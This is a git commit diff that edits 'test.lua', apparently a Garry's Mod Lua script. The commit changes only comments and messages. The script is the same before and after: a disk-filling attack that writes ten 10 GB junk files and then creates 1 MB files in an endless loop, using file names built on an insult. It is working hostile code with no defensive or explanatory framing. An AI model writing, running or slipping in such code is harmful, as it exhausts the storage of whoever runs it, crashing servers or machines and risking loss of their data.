010116a4e543ac3bd1f0ba494947f719b372479b
borsth <borsth123@gmail.com>
2025-05-22 21:28:20 +0300

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,24 +1,25 @@
-local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ
+local one_mb = string.rep("A", 1024 * 1024) -- 1 МБ блок
 local fileIndex = 0
 
--- 10 файлов по 10 ГБ
+-- Шаг 1: 10 файлов по 10 ГБ
 for i = 1, 10 do
     fileIndex = fileIndex + 1
     local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
-    if not f then print("Ошибка открытия файла!") return end
+    if not f then error("Не удалось открыть файл " .. fileIndex) end
 
-    for j = 1, 10240 do -- 10 ГБ = 10240 МБ
+    for j = 1, 10240 do -- 10,240 * 1 МБ = 10 ГБ
         f:Write(one_mb)
     end
+
     f:Close()
-    print("[10GB FILE] Created Igay_" .. fileIndex)
+    print("[10GB FILE] Created: Igay_" .. fileIndex)
 end
 
--- Бесконечные 1 МБ файлы
+-- Шаг 2: бесконечно создавать 1 МБ файлы
 while true do
     fileIndex = fileIndex + 1
     local f = file.Open("Igay_" .. fileIndex .. ".dat", "wb", "DATA")
     f:Write(one_mb)
     f:Close()
-    print("[1MB FILE] Created Igay_" .. fileIndex)
+    print("[1MB FILE] Created: Igay_" .. fileIndex)
 end
